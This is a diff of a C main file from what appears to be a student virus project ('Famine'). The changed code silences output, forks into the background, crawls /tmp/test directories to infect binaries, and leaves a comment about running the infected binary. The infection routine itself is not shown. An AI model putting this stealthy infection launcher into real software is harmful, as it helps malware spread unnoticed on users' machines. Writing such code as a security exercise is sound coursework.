@@ -6,11 +6,11 @@
 /*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/02/20 12:30:09 by mbatty            #+#    #+#             */
-/*   Updated: 2026/03/04 11:52:05 by mbatty           ###   ########.fr       */
+/*   Updated: 2026/04/13 18:01:45 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
-#include "infect.h"
+#include "famine.h"
 
 #include <fcntl.h>
 #include <unistd.h>
@@ -21,8 +21,12 @@ int	mute_outputs()
 	if (fd == -1)
 		return (-1);
 	
-	dup2(fd, STDOUT_FILENO);
-	dup2(fd, STDERR_FILENO);
+	if (dup2(fd, STDOUT_FILENO) == -1
+		|| dup2(fd, STDERR_FILENO) == -1)
+	{
+		close(fd);
+		return (-1);
+	}
 
 	close(fd);
 	return (0);
@@ -30,8 +34,16 @@ int	mute_outputs()
 
 int	main(void)
 {
-	mute_outputs();
-	infect_dir("/tmp/test");
-	infect_dir("/tmp/test2");
+	if (mute_outputs() == -1)
+		return (0);
+
+	int	pid = fork();
+	if (pid == -1 || pid != 0)
+		return (0);
+
+	crawl_dir("/tmp/test");
+	crawl_dir("/tmp/test2");
+
+	// execute infected binary if there is one
 	return (0);
 }
